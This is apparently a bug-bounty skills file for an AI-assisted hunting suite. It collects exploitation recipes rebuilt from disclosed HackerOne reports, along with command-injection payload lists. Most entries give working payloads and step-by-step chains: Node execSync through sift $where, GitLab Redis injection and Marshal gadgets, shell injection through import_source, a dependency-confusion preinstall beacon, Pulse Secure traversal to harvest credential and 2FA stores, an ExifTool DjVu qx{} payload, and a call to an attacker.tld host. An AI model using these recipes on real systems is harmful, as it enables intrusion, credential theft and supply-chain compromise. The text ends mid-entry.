**Mechanism:** Some sinks treat strings as *code*: `eval`, `new Function`, string-first `setTimeout`/`setInterval`, `$.globalEval`, attacker-URL `import()`, `location = "javascript:..."`, `setAttribute('href','javascript:...')`, `iframe.srcdoc`, jQuery's `$(htmlString)` auto-parse. Upstream encoding and "safe string" handling become irrelevant once the string is evaluated. The violated assumption: "it's just a string" — at this sink it's a program.

**Preconditions:**
- Tainted input reaches an eval-family sink (directly or via a V-09 gadget).
- For `javascript:` URLs: a click (or automatic navigation for `location`/form action).
- CSP without `unsafe-eval`/`unsafe-inline` blocks several of these — check the header first and score it as a real mitigant.

**Detect:**
1. Grep shipped JS for the sink list, then backward-trace to sources (V-03's method) — sinks hide one hop deep: `parse(config)` → `Function(fn)`.
2. Beware look-alikes: `JSON.parse`/`JSON5.parse` (safe), `setTimeout(fn,...)` where `fn` is a *function* (safe — only strings execute).
3. Probe with a malformed payload (`';`): a thrown SyntaxError (console or timing delta) is a strong signal the string is being evaluated.
4. Break on the sink in DevTools; visit; confirm your bytes are the evaluated argument.

**Proof of concept:**
```http
GET /app?callback=alert(document.domain)//      # JSONP-style callback sink
GET /app?redirect=javascript:<PROOF>()          # location sink — note navigation/click requirement
```

**Confirm:** debugger hit showing the attacker string as the eval/Function/setTimeout argument, plus execution. For `javascript:` sinks, execute from a clean session with a documented click and state the interaction requirement.

**False positives:** `setTimeout(function(){...})` with a *function* argument (inert); strings reaching `JSON.parse` (throws, doesn't execute); **`script.innerHTML = payload` never executes** (classic gotcha — need `appendChild` of a created script, `srcdoc`, or eval); `javascript:` rendered as text in a `value` attribute (no handler, no execution); `$(userInput)` failing jQuery's HTML heuristic and treated as a selector (throws, not executes — verify which mode fired).

**Impact:** eval-family sinks are severity-solid: input executes as code with the page's full origin privileges, and any encoding/WAF defense downstream of the sink is bypassed by definition.

**Remediation:** remove string-eval — look callbacks up by name from an allowlist map instead of `eval`, and pass data through a strict parser before any evaluation.

**CWE / OWASP:** CWE-95 (Eval Injection) / CWE-79 / OWASP A03:2021 Injection.

---

## [Bugbountyskills.md] Server-Side Template Injection (SSTI)

## [Bugbountyskills.md] Command Injection

```bash
;id;
| id
$(id)
`id`
%0aid%0a
```

### [Bugbountyskills.md] D. Command Injection, Code Injection, and RCE

- OS command injection.
- Server-side code injection.
- Expression-language and interpreter injection.
- Template injection that can lead to code execution.
- Unsafe evaluation and dynamic code execution.
- File-processing and deserialization-related execution.
- Sandbox escape and insecure sandbox configuration.
- Build, CI/CD, plugin, and dependency execution paths.

Distinguish theoretical injection from demonstrated execution. Analyze execution context, privileges, isolation boundaries, reachable code paths, and business impact.

Never attempt destructive commands, persistence, or uncontrolled execution on a live target.

### [Bugbountyskills.md] E. SSTI, SSRF, XXE, and Deserialization

- Server-side template injection (SSTI).
- Server-side request forgery (SSRF), including blind SSRF.
- XML external entity processing (XXE).
- Insecure deserialization of untrusted data.
- Unsafe YAML, JSON, XML, binary, and object serialization workflows.
- Internal trust boundaries, parser configuration, and file-processing pipelines.

Use harmless canaries or approved test infrastructure. Never access cloud metadata, internal services, or third-party systems without explicit authorization.

## [Bugbountyskills.md] 2026-10-21 — suite restructure: rce-ssrf-testing split in two

- Source: own-maintenance, user directive ("RCE and SSRF as 2 different skills").
- Lesson: the combined 15-variant skill had two disjoint sink classes (code-execution vs
  server-side fetch) sharing one selection table, which blurred routing — an observed
  URL-fetch signal and an observed exec signal both landed on the same skill page. Split at
  the class boundary: `rce-testing` (9 variants: V-01 cmd injection, V-02 code eval, V-03
  deser, V-04 upload→shell, V-05 SSTI, V-06 memcorrupt, V-07 arg injection, V-08 config
  loading, V-09 env-var RCE) and `ssrf-testing` (6 variants: V-01 basic scanning, V-02 blind
  pipelines, V-03 cloud metadata, V-04 rebinding, V-05 protocol smuggling, V-06 render SSRF).
  Payloads split too: cmd/SSTI/upload ladders → rce, probing ladder + metadata recipes → ssrf.
  Cross-skill refs in all 9 siblings + bug-hunter routing table updated; guardrails preserved
  on both sides (metadata identity-only rule → ssrf; no-shells-first + no-persistence → rce).
- Class: suite maintenance → skill: `bug-hunter` (routing), `SKILL_SPEC.md` (suite table),
  every sibling's chain-it-with sections
- Change: new `rce-testing/` + `ssrf-testing/` dirs per SKILL_SPEC; old `rce-ssrf-testing/`
  retired pending deletion; bug-hunter table row split into command-ish → rce vs URL-fetch → ssrf.
- Repeat signal: first restructure — if another class splits later (e.g. pure LFI vs RFI),
  same procedure: split at sink boundary, renumber within each skill, fix all cross-refs in
  the same pass, log here.

## [Bugbountyskills.md] RCE (`rce-testing`)

| Endpoint | Param | Signal | Status |
|---|---|---|---|
| `POST /api/business/massAssignment` | multipart **file** | the only route outside the auth wrapper; CSV is parsed server-side (`error-in-sheet`, `cant-read-file` result codes) → parser/XXE/formula/template risk | Untested — **priority** |
| `GET /api/proxy/orders/{id}/{itemId}` | ids | download handler | Untested |

No `cmd`/`exec`/`eval`/template sinks in app code (the lone `eval(` is vendor). **RCE surface is
thin — it hinges entirely on the CSV upload.**

### [Bugbountyskills.md] 17.3 GraphQL free-form `filter` JSON → JS-library `$where` → `new Function` → unauthenticated RCE in the Node process

SOURCE: HackerOne #3782701 — Mozilla Taskcluster web-server, "Unauthenticated RCE … via GraphQL filter argument (sift $where)" (Critical, $12,000, disclosed 2026-08-05)  read 2026-11-07
CLASS: code/expression injection via a JS filtering library (CWE-94 / CWE-95)
CORE METHOD:
  1. Find a GraphQL field whose `filter`/`where`/`query` argument is passed unvalidated into an in-memory JS query library — `sift`, `mingo`, `json-query`, `jsonata`, `alasql` are the sinks.
  2. Probe the operator surface: `{"filter":{"$where":"1==1"}}` (also `$expr`, `$function`, `$accumulator`, `$jsonSchema`). If `$where` is accepted as a STRING, sift compiles it with `new Function("obj","return "+params)`.
  3. Confirm execution with a benign oracle (`"$where":"process.version"`, or a match only a running expression can satisfy).
  4. Execute: `{"filter":{"$where":"process.mainModule.require('child_process').execSync('id').toString()"}}`.
  5. Exfiltrate the process env (DB creds, deployment access token, OAuth client secrets, encryption keys) — the env is the prize even short of a shell.
  6. Note `process.env.CSP_ENABLED`: when unset, sift runs the string path (it throws in CSP mode) — a cheap pre-signal.
DETECTION SIGNAL: Node.js GraphQL service; `filter`/`where` typed as free-form JSON; sift/mingo/jsonata in the dependency list; `$where`/`$expr` accepted without error; response differs for `"$where":"true"` vs `"false"`.
CHAIN: unauth GraphQL query → JS-expression sink (`new Function`) → arbitrary JS in the server process → shell as the service user → read env → DB/OAuth/deploy secrets → full instance compromise (this service ran Firefox CI → supply-chain reach).
TRANSFERABLE TEST: On any GraphQL endpoint POST `{"query":"{ things(filter:{ $where:\"1==1\" }){ id } }"}` then `1==0`; a differential proves the code-compile path. Escalate through a `process.env` read before attempting a shell.

<!-- exact-duplicate entries folded in: 1 -->

### [Bugbountyskills.md] 17.10 Ruby Octokit/Sawyer method override → redis RESP size-desync → injected Redis command → Marshal.load session deserialization → RCE (GitLab GitHub import)

SOURCE: HackerOne #1679624 — GitLab (vakzz), "Remote Command Execution via Github import" (CVE-2022-2992, CVSS 9.9 Critical, $33,510, disclosed 2022-10-06)  read 2026-11-07
NOTE: the primary report page (hackerone.com/reports/1679624) did NOT render on direct fetch — web_extract returned the JS shell and the browser hit HackerOne's "Sorry, something went wrong" page (not logged in). Method reconstructed from the report's indexed summary + vakzz's HackerOne profile + GitLab work item #371884 + the Metasploit module gitlab_github_import_rce_cve_2022_2992; no content invented.
CLASS: RCE via protocol/parameter type confusion → RESP (Redis) command injection → insecure deserialization (CWE-843 → CWE-77 → CWE-502)
CORE METHOD:
  1. Entry point: authenticated GitHub-import API. `POST /api/v4/import/github` with `{"personal_access_token":"x","repo_id":"12345","target_namespace":"root","new_name":"gh-import","github_hostname":"https://attacker.tld"}`. GitLab then drives `github_hostname` (the attacker server) using the Octokit/Sawyer GitHub client, fetching repo metadata from it.
  2. Type-confusion primitive: in Ruby the client wraps JSON responses in `Sawyer::Resource`, whose `method_missing` lets ANY JSON key override a method — including `to_s` and `bytesize`. Return `default_branch` as an OBJECT, not the documented string:
     `{"default_branch":{"to_s":{"to_s":"ggg\r\n<RESP>","bytesize":3}}}`
  3. RESP size-desync: GitLab passes that value through `change_head → branch_exists? / branch_names_include?` down into the redis gem, which builds the RESP frame from `to_s` and `bytesize`. Because the declared `bytesize` (3) is SHORTER than the real string, the trailing bytes spill into the socket stream as RAW extra RESP commands (see redis protocol spec). CVE-2022-2884 patched one redis sink in `Gitlab::Cache::Import::Caching`; this is a SECOND sink reachable via `default_branch`.
  4. Inject Redis: emit `*3\r\n$3\r\nset\r\n$<len>\r\nsession:gitlab:<id>\r\n$<len>\r\n<ruby-marshalled payload>` — i.e. `SET session:gitlab:<id>` = a Ruby `Marshal` serialized gadget (devcraft.io universal Ruby deserialization gadget, using `Net::WriteAdapter`/`Gem::Requirement` to reach `Kernel#system`).
  5. Trigger deserialization: `GET /<group>` with `Cookie: _gitlab_session=<id>` → Rails loads the session blob via `Marshal.load` → the gadget fires → command execution as the `git` OS user (a shell is returned).
DETECTION SIGNAL: an authenticated "import from remote" / webhook / unfurl / metadata-pull feature where the server consumes attacker-served JSON through a Ruby Octokit/Sawyer (or any `method_missing` proxy) client; any place a JSON value flows into a LENGTH-PREFIXED protocol builder (redis RESP, memcached, gopher) or into `Marshal.load`/`YAML.load`; the API accepts an object/array where a string is documented; an exceptions log line like `comparison of String with 0 failed` after the import.
CHAIN: authenticated import → attacker API returns nested `default_branch` object → Sawyer overrides `to_s`/`bytesize` → RESP size-desync injects an extra Redis `SET` → `session:gitlab:<id>` key holds a `Marshal` gadget → `_gitlab_session` cookie triggers `Marshal.load` → RCE as the `git` user → server/CI compromise.
TRANSFERABLE TEST: For any feature where the server fetches and parses attacker-controlled JSON (repo/URL import, webhook, preview/unfurl, remote config), return a value as an OBJECT with keys `to_s`+`bytesize` (also try `hash`, `length`, `to_str`) instead of a scalar and watch for a protocol-desync error (`comparison of String with 0 failed` = the tell). In parallel grep the target for flows where fetched data reaches `Marshal.load`/`YAML.load`; if a frame-injectable cache holds a session blob, store a gadget under the session key and trigger a reload.

### [Bugbountyskills.md] 17.11 Shell-string sink: import/migration source path interpolated into Open3.popen3 -> command injection -> RCE (GitLab bulk project import)

SOURCE: https://hackerone.com/reports/1609965  2026-11-07
CLASS: command injection / RCE (CWE-78) — GitLab DecompressedArchiveSizeValidator + BulkImport ProjectPipeline
CORE METHOD:
  1. Sink is a shell STRING: `DecompressedArchiveSizeValidator#command = "gzip -dc #{@archive_path} | wc -c"`, passed as a string to `Open3.popen3(command)`. Shell interpolation ⇒ any metachar in the path runs commands (the array form `["gzip","-dc",path]` would be safe; the string form is not).
  2. `@archive_file` comes from `project.import_source` (via ImportExport::Importer → FileImporter). Normally import_source is nil and derived, so find the path where it becomes attacker-settable.
  3. Entry point = `BulkImports::Projects::Pipelines::ProjectPipeline`. Its transformers only strip a `PROHIBITED_REFERENCES` regex (`cached_markdown_version`, `id`, `*_id`, `*_ids`, `*_html`, `attributes`, `remote_*_(url|urls|request_header)`) and pass the REST of the JSON straight into `Projects::CreateService`. So set `import_source` to a shell payload.
  4. `import_source` alone leaves `import_type=gitlab_project_migration` (import_schedule skipped). Flip it live by ALSO sending `template_name=rails`: CreateService routes to `CreateFromTemplateService` → `GitlabProjectsImportService`, which sets `import_type='gitlab_project'` when a template file is present ⇒ `import_schedule` runs ⇒ your `import_source` becomes `@archive_file`.
  5. Deliver: run "import group from another GitLab instance" pointed at YOUR fake GitLab API server that proxies the real API but injects `template_name`+`import_source` into the exported project's attributes. After `wait_for_archived_file` times out (~255s; MAX_RETRIES loop continues) `validate_decompressed_archive_size` fires ⇒ payload executes on the Sidekiq worker.
  6. Payload: `"import_source":"/tmp/ggg;echo lala|tee /tmp/1234;#"` (cannot contain `>` — JSON makes it `\u003c`). Worker-log tell: `command exited with error code 2: tar (child): /tmp/ggg;echo lala|tee /tmp/1234;#: Cannot open`.
DETECTION SIGNAL: any sink that builds a shell command by string-interpolation from a user/import/config value and hands the STRING to `Open3.popen3`/`system`/backticks; an import/migration pipeline that allow-lists-out only a few keys then merges the rest into a create-service (`import_source`, `template_name`); a feature-flag-gated import path that is under-audited.
CHAIN: authenticated low-priv import → unfiltered `import_source` param merged into project create → `template_name` flips import_type to `gitlab_project` → path with shell metachars reaches `Open3.popen3(string)` → RCE as the `git` service user → full instance compromise (Critical 9.9, $33,510, CVE-2022-2185).
TRANSFERABLE TEST: For every import/migration/export/backup feature, set any path/URL/source field to `x;id;#` (also `` `id` ``, `$(id)`, `|id`) and grep the worker/error log for your payload echoed inside a shell error message — that string-echo proves it reached a shell-string sink. In parallel grep the code for `popen(`/`system(`/backticks fed by an interpolated string vs an array.

### [Bugbountyskills.md] 17.12 Dependency confusion: unclaimed internal package name resolved from the public registry, install hook runs in CI -> supply-chain RCE (PayPal npm)

SOURCE: https://hackerone.com/reports/925585  2026-11-07
CLASS: code injection via supply chain / dependency confusion (CWE-427) — PayPal npm
CORE METHOD:
  1. Enumerate package names the target's builds resolve but that exist only internally: leaked `package.json` in public repos, source maps, error logs, `.npmrc` scope config, JS bundles referencing scoped deps.
  2. Check each name on the PUBLIC registry; if unclaimed, register it there.
  3. Publish with a HIGHER semver than the internal one and an install hook — `"scripts":{"preinstall":"node beacon.js"}`. npm resolves the highest version across configured registry/indexes and runs lifecycle scripts on install alone (the package need not be `require`d).
  4. Wait and confirm execution by DNS/HTTP callback from inside the corp build network (beacon exfiltrates hostname/whoami). PayPal's own summary: "certain development projects defaulted to the public NPM registry instead of the intended internal packages; since the packages on the public registry did not exist, the researcher created these and observed they were downloaded."
DETECTION SIGNAL: a repo/build config referencing internal, UNSCOPED package names with no registry/scope pin (`.npmrc` `@scope:registry=`, yarn `npmRegistryServer`, bundler source scoping); manifest names that are unclaimed/404 on the public registry; CI installing with the default registry.
CHAIN: unclaimed internal package name → attacker publishes a higher-version public twin with an install hook → CI/dev machine resolves the public package → preinstall/postinstall script runs inside the corp network → RCE → supply-chain compromise (Critical 10.0, $30,000; alexbirsan & rhynorater).
TRANSFERABLE TEST: Harvest dependency names from leaked manifests/bundles → check each on the public registry (`npm view <name>`, `pip index versions`, `gem search`); if unclaimed, publish a benign same-named canary at version 99.99.99 with a DNS-beacon install script and wait for a callback from the target's network. Same primitive across npm, PyPI, RubyGems, Maven.

### [Bugbountyskills.md] 17.14 Internet-exposed unauthenticated Kubernetes API -> cluster-admin -> pod/job RCE + Secret/credential theft (Snapchat)

SOURCE: https://hackerone.com/reports/455645  2026-11-07
CLASS: exposed orchestration API / auth-missing misconfig → RCE + credential theft (CWE-306) — Snapchat Kubernetes
CORE METHOD:
  1. Discovery: worldwide scan for internet-exposed Kubernetes control-plane/kubelet APIs (report used binaryedge.io). Candidates: `:6443`, `:8443`, `:8080`, `:10250`, any API server answering without auth.
  2. Confirm unauthenticated access — `GET /version`, `GET /api/v1/namespaces`, `GET /api/v1/pods` return data / `200` with NO `Authorization` header (or a default/blank SA token is accepted).
  3. Enumerate with no creds: `kubectl --server=https://<host>:6443 --insecure-skip-tls-verify get pods,sa,secrets -A`; the report's access was effectively cluster-admin.
  4. Escalate to code execution: create a job/pod (privileged container or host-path mount) to run arbitrary commands on the node; or read mounted service-account tokens / `secrets` objects to reach other services.
  5. Harvest credentials reachable from cluster-admin → "internal access to a significant number of instances" (per Snapchat's summary).
DETECTION SIGNAL: a k8s API server, kubelet (`:10250/pods`, `/run`), dashboard, or etcd reachable from the internet answering with no auth (`GET /api/v1/namespaces` returns JSON); anonymous-auth enabled / `system:anonymous` bound to broad verbs; no NetworkPolicy.
CHAIN: internet-exposed unauthenticated k8s API → act as cluster-admin → create privileged pod/job → RCE on cluster nodes → read Secret objects / mounted SA tokens → lateral access to many internal instances → Critical (9–10, $25,000).
TRANSFERABLE TEST: On any exposed cluster endpoint run `kubectl get pods,sa,secrets -A --server=... --insecure-skip-tls-verify` with NO token, plus `kubectl auth can-i --list`; if it returns objects you are unauthenticated — prove with ONE benign pod/job (whoami) and STOP (no availability impact), then read one non-destructive Secret to show credential reach.

### [Bugbountyskills.md] 17.19 Perimeter appliance pre-auth file read -> runtime credential/session-store harvest -> 2FA bypass -> post-auth RCE (Pulse Connect Secure / Twitter #591295)

SOURCE: https://hackerone.com/reports/591295  2026-11-07
CLASS: pre-auth arbitrary file read on a perimeter appliance → runtime credential/session-store harvest → 2FA bypass / session-cookie forgery → post-auth command injection → pre-auth RCE (CWE-22 → CWE-522 → CWE-78) — Pulse Connect Secure (Twitter VPN; CVE-2019-11510 / -11539)
CORE METHOD:
  1. Pre-auth file read (CVE-2019-11510): Pulse's web server validates `request->uri` but serves `request->filepath`, and the HTML5-Access/Guacamole feature widened validation. Put `/dana/html5acc/guacamole/` BOTH at the end of the query string (to pass validation) and in the middle of the path (to widen the served extension allowlist):
     `GET https://sslvpn/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/`  — no authentication required.
  2. Harvest the appliance runtime state through the same primitive: `/etc/passwd`, `/etc/hosts`, `/data/runtime/mtmp/system` (VPN usernames + hashes), `/data/runtime/mtmp/lmdb/dataa/data.mdb` (+`lock.mdb`), `/data/runtime/mtmp/lmdb/randomVal/data.mdb` (+`lock.mdb`).
  3. What each store gives you: `mtmp/system` holds the 2FA (Duo) integration key + secret `skey` + API hostname and the LDAP bind password; `dataa/data.mdb` is a PLAINTEXT-password cache the appliance never clears after a user's Perl↔C++ exchange; `randomVal/data.mdb` is the session store.
  4. Bypass 2FA two ways: (a) use the leaked Duo `skey` + API hostname to drive the Duo API and mint valid 2FA approvals; or (b) if "Roaming Session" is enabled (session valid from multiple IPs), download `randomVal/data.mdb` and FORGE the session cookie/DSID → log in as that user from your own IP.
  5. Escalate post-auth — CVE-2019-11539, admin command injection in `/dana-admin/diag/diag.cgi`: `tcpdump_options_syntax_check(CGI::param("options"))` runs `system("$TCPDUMP_COMMAND -d $options >/dev/null 2>&1")`; inject shell metacharacters into `options` → RCE as the admin user. Reaching the internet-facing admin layout used an SSRF; the admin hash is `sha256(md5_crypt(salt,…))` (plaintext cached only for first-time logins) and was cracked with a 72-core rig.
  6. Chain = pre-auth file read → plaintext creds + appliance 2FA/session secrets → 2FA bypass / cookie forgery → authenticated session → post-auth admin command injection → pre-auth RCE. Vendor-feature bonus: the SSL-VPN "logon script" runs a script on every connecting client → mass client takeover once admin.
DETECTION SIGNAL: an edge appliance (SSL-VPN / firewall / load-balancer / mail gateway) on the perimeter whose web tier is fingerprintable; a traversal-oracle path (`/dana-*/…/../…`) that serves file contents pre-auth; runtime credential/session stores (`/data/runtime/mtmp/*.mdb`) reachable by that same traversal; session cookies not bound to the client IP (roaming sessions); an admin "diagnostic / ping / tcpdump" page that takes a command-ish parameter.
CHAIN: unauthenticated path traversal on the VPN appliance → read runtime LMDB (plaintext password cache + Duo 2FA keys + session DB) → bypass 2FA (forge/replay session or mint via Duo API) → authenticated VPN session → intranet reach → post-auth admin command injection → RCE (reported as effectively pre-auth RCE; the strongest finding the program had received).
TRANSFERABLE TEST: On any perimeter appliance, try the pre-auth traversal `/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/`; if it reads, pull the runtime stores (`mtmp/system`, `lmdb/dataa/data.mdb`, `lmdb/randomVal/data.mdb`) and use the leaked Duo/session material to bypass MFA. Separately, on any admin diagnostic page submit `options=;id;` / `|id` / `` `id` `` to a tcpdump/ping wrapper — a `system("<string>")` sink there is the RCE.

### [Bugbountyskills.md] 17.22 Upload-reference rewriter path traversal -> arbitrary file read -> secret_key_base cookie forgery -> RCE (GitLab UploadsRewriter #827052)

SOURCE: https://hackerone.com/reports/827052  2026-11-07
ROUTE: the HackerOne page rendered but its body was largely redacted; the exact mechanism was confirmed from the report's own linked GitLab work item #212175 (gitlab.com/gitlab-org/gitlab/-/work_items/212175) and mirrored writeups (hackmag.com/security/read-and-execute; exploit-db 48431). Nothing invented.
CLASS: path traversal in an upload-reference rewriter → arbitrary file read, chained to RCE via `secret_key_base` cookie forgery (CWE-22 → CWE-502) — GitLab UploadsRewriter (CVE-2020-10977)
CORE METHOD:
  1. The `UploadsRewriter` copies uploads referenced in an issue's markdown when the issue is MOVED to another project. It locates references with `MARKDOWN_PATTERN = %r{!?\[.*?\]\(/uploads/(?<secret>[0-9a-f]{32})/(?<file>.*?)\)}` and, per match, calls `find_file(source_project, secret, file)` → `FileUploader.new(project, secret: secret).retrieve_from_store!(file)`.
  2. The `file` group is never validated for traversal, so a `../` sequence in the filename resolves to any path on the server.
  3. Put the traversal into an issue description in project A: `![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)` — the 32-hex `secret` can be YOUR OWN upload's secret (create one benign upload first to learn the shape).
  4. Move the issue from project A to project B. The rewriter "copies the upload" — which resolves to `/etc/passwd` — into project B, stores it, and rewrites the markdown to the new upload URL.
  5. Open the issue in project B and request the rewritten upload URL → download the arbitrary file. Repeat for `/etc/passwd`, `/etc/ssh/sshd_config`, `/var/log/auth.log`, GitLab config/secrets, etc.
  6. Chain to RCE: read `/var/opt/gitlab/gitlab-rails/etc/secrets.yml` (`secret_key_base`); with the signing secret, forge a Rails-signed session cookie; GitLab's marshalled-cookie path then yields RCE (vakzz built the read into RCE; CVE-2020-10977, GitLab CE/EE ≥8.5/12.9, patched 12.9.1).
DETECTION SIGNAL: any feature that COPIES/REWRITES user-content file references on move/copy/import/export (markdown upload rewriter, attachment copy across projects, template/issue duplication, quote or ticket migration, export→import); a regex that extracts a filename/path from user content and hands it to a file-store `retrieve_from_store`/`File.open`/copy with no `basename`/traversal check; the "secret" path component is attacker-obtainable (create your own upload).
CHAIN: issue author → `![a](/uploads/<32hex>/../../../../etc/passwd)` in a description → the upload rewriter follows the traversal on "move issue" → arbitrary file read → `secrets.yml` `secret_key_base` + `db_key_base` → forged Rails session cookie / `attr_encrypted` decryption → RCE / full instance compromise (Critical 9–10, $20,000; CVE-2020-10977).
TRANSFERABLE TEST: Anywhere user content references a stored file and the app COPIES it (move issue, duplicate project/template, export/import, attachment migration), inject `![x](/uploads/<your-own-32hex-secret>/../../../../../../etc/passwd)` (also `..%2f`, and absolute paths) into the content, perform the copy/move, then fetch the rewritten reference; if `/etc/passwd` comes back it is arbitrary file read. Then hunt the app's signing secret among the readable paths and test cookie forgery for the escalation.


SOURCE: https://hackerone.com/reports/1154542  2026-11-07
ROUTE: report body rendered via HackerOne `.json` (vulnerability_information present, full).
CLASS: code injection / RCE via an image-metadata processor that EVALs parser tokens — content-based type sniffing defeats an extension allowlist (CWE-94) — GitLab "RCE when removing metadata with ExifTool"
CORE METHOD:
  1. GitLab Workhorse routes uploads with extensions jpg|jpeg|tiff to ExifTool to strip non-whitelisted metadata. ExifTool IGNORES the extension and sniffs the CONTENT, so renaming any file to `.jpg` still dispatches it to whatever parser matches its magic bytes.
  2. Pick an ExifTool parser that EVALs its metadata: DjVu (lib/Image/ExifTool/DjVu.pm) evals the annotation tokens to "convert C escape sequences". Its escaping is incomplete: a backslash immediately followed by a newline is mishandled, letting you re-open the quotes and inject arbitrary Perl.
  3. Build a DjVu file carrying (in annotation metadata) and rename it `.jpg`:
     (metadata (Copyright "\<newline>" . qx{echo vakzz >/tmp/vakzz} . \<newline>" b ") )
     qx{...} runs a shell command; qx{perl reverse-shell} yields a shell.
  4. Upload it to any GitLab image-processing surface (snippet "Attach a file", issue/MR attachment, avatar) → Workhorse shells ExifTool server-side → payload runs as the `git` user.
  5. Real result: an upload to https://gitlab.com/-/snippets/new produced a shell on `web-09-sv-gprd`; `id` → uid=500(git) uid=500(git).
DETECTION SIGNAL: any upload pipeline that shells out to a metadata/media tool (exiftool, ffmpeg/ffprobe, ImageMagick convert, ghostscript, pdfinfo, tika, doc converters) AND an extension allowlist the tool overrides by content sniffing; a parser in that tool whose code path calls eval/insert_* on file fields (DjVu annotations, SVG, XMP, ICC, .torrent, subtitle formats); a polyglot file (allowed magic bytes wrapping a different container).
CHAIN: any account able to attach a file → upload a content-sniffable DjVu renamed `.jpg` → extension allowlist bypassed by ExifTool's content sniff → DjVu annotation token `eval` → `qx{}` shell escape → RCE as the git service user (Critical, $20,000).
TRANSFERABLE TEST: On any target that shells to ExifTool/ffmpeg/ImageMagick on upload, submit a known-eval parser payload (DjVu annotation, SVG/XML, ffmpeg SSA/subtitle) renamed to an allowed image extension; if a marker file appears or a callback fires, the parser is the sink. Use the smallest payload that writes a known path — `qx{echo X >/tmp/X}` — to prove execution.

SOURCE: https://hackerone.com/reports/1125425  2026-11-07
ROUTE: report body rendered via HackerOne `.json` (vulnerability_information present, full).
CLASS: code injection / RCE via user-controlled RENDERER options that reach a class-instantiation sink, then a `require`/`load` sink with directory traversal (CWE-470 "externally-controlled input selects classes" → CWE-98/CWE-22) — GitLab "RCE via unsafe inline Kramdown options when rendering Wiki pages"
CORE METHOD:
  1. A wiki/content renderer accepts kramdown documents; certain extensions (e.g. `.rmd`) route through `other_markup_unsafe` → `GitHub::Markup.render` → `Kramdown::Document.new(content).to_html`. Any file extension can be committed by cloning the project wiki over git.
  2. Kramdown honours INLINE OPTIONS parsed from the document body: `{::options ... /}`. Setting `syntax_highlighter="rouge"` plus `syntax_highlighter_opts="{formatter: <Class>, ...}"` makes Rouge call `::Rouge::Formatters.const_get(opts[:formatter]).new(opts)` — an attacker-chosen class is `const_get`-instantiated, gated only by `/\A[[:upper:]][[:alnum:]_]*\z/` (no namespaces, but any top-level class, e.g. `CSV`).
  3. Choose a loaded class whose constructor takes a file/loader option. `Redis` (redis-rb) has a `driver` option; `_parse_driver` does `require_relative "connection/#{driver}"` then falls back to `require "connection/#{driver}"`, with NO path check on `driver` → traversal + arbitrary Ruby file EVALUATION.
  4. Get the payload to a known path: attach a `.rb` file to a snippet/issue; GitLab stores it under the uploads dir and returns `/uploads/-/system/user/1/<secret>/payload.rb` (absolute `/var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/<secret>/payload.rb`). Payload body: `puts "hello"; \`echo X > /tmp/X\``.
  5. Commit `page1.rmd` to the project wiki (git clone <proj>.wiki.git; add file; push):
     {::options auto_ids="false" footnote_nr="5" syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/<secret>/payload.rb}" /}
     ~~ ruby
     def what?
       42
     end
     ~~
  6. Loading the wiki page triggers the render of the fenced block → Rouge instantiates `Redis` → `require` evaluates `payload.rb` → RCE (`/tmp/X` created). Test step 7 to also confirm the sink: an error `wrong constant name ../../.. /payload.rb` traces through `other_markup_unsafe` → `render_wiki_content`.
DETECTION SIGNAL: any rich-text/markdown/wiki renderer exposing CONFIG through document content (kramdown `{::options}`, Hugo/RDoc/Jekyll/Pandoc front-matter or highlight opts, Liquid/template options); a `const_get`/`Class.new`/`constantize` on a user-supplied string; a downstream `require`/`load`/`send` sink fed by a SECOND user-controlled field; a git-backed wiki/content store that accepts arbitrary file extensions.
CHAIN: any user with wiki push access → commit `.rmd` with inline `{::options}` → Rouge `formatter:` selects the loaded `Redis` class → its `driver:` option reaches `require` with `../` traversal → uploads-dir `payload.rb` is evaluated → arbitrary Ruby / RCE (Critical, $20,000; fixed in GitLab 13.10.3).
TRANSFERABLE TEST: In any markdown/wiki renderer, submit `{::options syntax_highlighter_opts="{formatter: <SomeLoadedClass>, <opt>: ../../../../etc/passwd}" /}` (or the platform's equivalent inline-config syntax); a class-instantiation error naming YOUR class proves the `const_get` sink. Then find a second constructor option that hits `require`/`load`/`eval` and point it at a file you can upload (snippet/issue attachment) for the RCE.

SOURCE: https://hackerone.com/reports/1379975  2026-11-07
ROUTE: report body redacted in HackerOne `.json` (empty) and page is Cloudflare-gated; retrieved via the disclosed-reports mirror (raw.githubusercontent.com/ajaysenr/HackerOne-Disclosed-Reports/main/reports/1379975.md). All quoted code/steps are the report's own text.
CLASS: sandbox / privileged-context escape → arbitrary code execution — a 5-bug chain (insecure deserialization → arbitrary class instantiation → reflective permission bypass → write-what-where → native parser overflow) on the BD-J (Blu-ray Java) runtime (CWE-502 → CWE-470 → CWE-269 → CWE-787) — PlayStation 4/5
CORE METHOD:
  1. Insecure deserialization under privileged context (V1, MEDIUM): `com.sony.gemstack.org.dvb.user.UserPreferenceManagerImpl` reads the `userprefs` file with `ObjectInputStream.readObject()` inside `AccessController.doPrivileged(ReadPreferenceAction)`. Replace `userprefs` with a malicious serialized object → instantiate classes under privileged context. On firmwares lacking an upstream JDK blacklist commit, instantiate a `ClassLoader` subclass and call `defineClass` with all permissions → bypass the SecurityManager.
  2. Arbitrary class instantiation (V2, MEDIUM): `com.oracle.security.Service.newInstance` calls `Class.forName` on an arbitrary class name → instantiate ANY class (even `sun.*`) with a single-arg public constructor; the `registered` guard is bypassed by calling `com.oracle.ProviderAdapter.setProviderAccessor` with a custom `ProviderAccessor`.
  3. Reflective permission bypass (V3, MEDIUM): `com.sony.gemstack.org.dvb.io.ixc.IxcProxy.invokeMethod` calls methods under privileged context; permission checks (e.g. on `File.list()`) are skipped when the method is public+non-static and its class is public, non-final and instantiable. Write a subclass of the target class implementing an interface whose method throws `RemoteException` — e.g. `class FileImpl extends File implements FileInterface { FileImpl(String p){super(p);} }` with `interface FileInterface extends Remote { String[] list() throws RemoteException; }` → call restricted methods; use it to dump `/app0/` and leak the filesystem.
